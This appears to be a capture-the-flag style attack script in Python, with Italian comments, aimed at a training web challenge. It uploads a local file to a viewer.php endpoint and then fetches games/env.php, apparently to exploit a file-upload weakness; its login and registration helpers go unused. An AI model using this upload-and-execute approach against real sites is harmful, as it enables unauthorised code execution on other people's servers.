import requests
import threading
import random
import string
import logging

baseurl="http://1024.training.jinblack.it/"

logging.basicConfig(filename='debug.log', level=logging.DEBUG)

def randomString():
    return ''.join(random.sample(string.ascii_letters + string.digits, 10))
        
def login(session,username,password, log_user):
    url="%s/login.php" % baseurl
    data={"username": username, "password": password, "log_user": log_user}
    r=session.post(url, data=data)
    #print(r.text)

def registration(session, username, password1, password2, reg_user):
    url="%s/register.php" % baseurl
    data={"username": username, "password_1": password1, "password_2": password2, "reg_user": reg_user}
    r=session.post(url, data=data)
    #print(r.text)
    return r.text

def upload(session):
    url = "%s/viewer.php" % baseurl
    files = {'': open('upload.py', 'rb')}
    
    try:
        r = session.post(url, files=files)
        r.raise_for_status()  # Solleva un'eccezione in caso di errore HTTP
        print("Richiesta inviata con successo!")
        logging.debug("Upload Files: %s", files)

        #print(r.text)
    except requests.exceptions.RequestException as e:
        print(f"Errore durante l'invio della richiesta: {e}")

def see(session):
    #url = "http://1024.training.jinblack.it/game.php?action=getRanking"
    url="http://1024.training.jinblack.it/games/env.php"
    try:
        response = session.get(url)
        response.raise_for_status()  # Solleva un'eccezione se c'è un problema con la richiesta HTTP
        print('avvenuta con successo')
    # Stampa il contenuto della risorsa
        print(response.text)
    except requests.exceptions.RequestException as e:
        print(f"Errore durante la richiesta HTTP: {e}")
    

s = requests.Session() #  to create session
upload(s)
see(s)

